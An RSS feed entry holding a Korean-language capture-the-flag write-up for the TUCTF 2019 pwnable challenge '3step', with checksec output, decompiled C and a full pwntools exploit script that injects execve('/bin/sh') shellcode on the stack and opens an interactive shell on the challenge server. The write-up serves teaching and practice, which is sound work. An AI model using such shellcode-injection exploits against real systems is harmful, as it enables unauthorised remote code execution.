<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>3step on j3rrry</title>
    <link>/tags/3step/</link>
    <description>Recent content in 3step on j3rrry</description>
    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator>
    <language>en-us</language>
    <copyright>&amp;copy; {year} j3rrry</copyright>
    <lastBuildDate>Tue, 03 Dec 2019 03:33:19 +0900</lastBuildDate>
    
	    <atom:link href="/tags/3step/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>TUCTF 2019 Pwnable 3step</title>
      <link>/post/3step/</link>
      <pubDate>Tue, 03 Dec 2019 03:33:19 +0900</pubDate>
      
      <guid>/post/3step/</guid>
      <description>

&lt;p&gt;32bit 바이너리 &lt;code&gt;3step&lt;/code&gt;와 접속 정보 &lt;code&gt;nc chal.tuctf.com 30504&lt;/code&gt;가 주어졌습니다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; e = ELF(&#39;./3step&#39;)
[*] &#39;/root/ctf/2019/tu/pwn/3step/3step&#39;
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;i386 바이너리이고&lt;br /&gt;
Full RELRO 이므로 GOT Overwrite는 아니며&lt;br /&gt;
Canary가 있으므로 BOF는 아니고&lt;br /&gt;
NX bit가 해제되어 있고 RWX 세그먼트가 있으므로 100% 스택에 쉘코드 실행 가능합니다.&lt;br /&gt;
&lt;br&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;j3rrry@kali:3step# nc chal.tuctf.com 30504
Welcome to our 3-step program!
Try out complimentary snacks
0x5665000c
0xffb5c08c

Step 1: j3rrry
Step 2: j4rrry
Step 3: j5rrry
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;문제 서버에 접속해보면 16진수 2개를 알려준 다음 3 Step에 걸쳐서 입력을 받습니다.&lt;br /&gt;
&lt;br&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void __cdecl pwnme()
{
  void (*v0)(void); // [sp+8h] [bp-20h]@1
  char buf; // [sp+Ch] [bp-1Ch]@1
  int v2; // [sp+1Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  puts(&amp;quot;Try out complimentary snacks&amp;quot;);
  printf(&amp;quot;%p\n&amp;quot;, &amp;amp;buf1);
  printf(&amp;quot;%p\n\n&amp;quot;, &amp;amp;buf);
  printf(&amp;quot;Step 1: &amp;quot;);
  read(0, &amp;amp;buf1, 0x12);
  printf(&amp;quot;Step 2: &amp;quot;);
  read(0, &amp;amp;buf, 0x10);
  printf(&amp;quot;Step 3: &amp;quot;);
  read(0, &amp;amp;v0, 4);
  v0();
  if ( *MK_FP(__GS__, 20) != v2 )
    _stack_chk_fail_local();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;바이너리를 디스어셈블링 해보면&lt;br /&gt;
buf1과 buf의 주소를 출력해준다는 것을 알 수 있습니다.&lt;br /&gt;
buf1은 bss 영역, buf는 스택 영역입니다.&lt;/p&gt;

&lt;p&gt;그리고 입력을 받는데 길이제한이 0x12, 0x10, 4로 매우 작습니다.&lt;br /&gt;
쉘코드를 경량화하도록 커스텀을 해야하는데요.&lt;/p&gt;

&lt;h1 id=&#34;exploit&#34;&gt;Exploit&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from pwn import *

def start():
    e = ELF(&#39;./3step&#39;)
    r = remote(&#39;chal.tuctf.com&#39;, 30504)

    return e, r

def info():
    r.recvuntil(&#39;0x&#39;)
    bss = int(r.recvline(), 16)
    stack = int(r.recvline(), 16)
    log.info(hex(bss) + &#39; bss&#39;)
    log.info(hex(stack) + &#39; stack&#39;)

    return bss, stack

def step1():
    r.recvuntil(&#39;: &#39;)
    r.send(&#39;/bin/sh&#39;)

def step2():
    r.recvuntil(&#39;: &#39;)
    r.send(shellcode)

def step3():
    r.recvuntil(&#39;: &#39;)
    r.send(p32(stack))

if __name__ == &#39;__main__&#39;:
    e, r = start()
    bss, stack = info()

    shellcode = &#39;&#39;&#39;
        mov ebx, {}
        xor ecx, ecx
        xor edx, edx
        xor eax, eax
        mov al, 0xb
        int 0x80
        mov al, 0xb
        int 0x80
    &#39;&#39;&#39;.format(bss)
    shellcode = asm(shellcode)

    step1()
    step2()
    step3()

    r.interactive()
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>
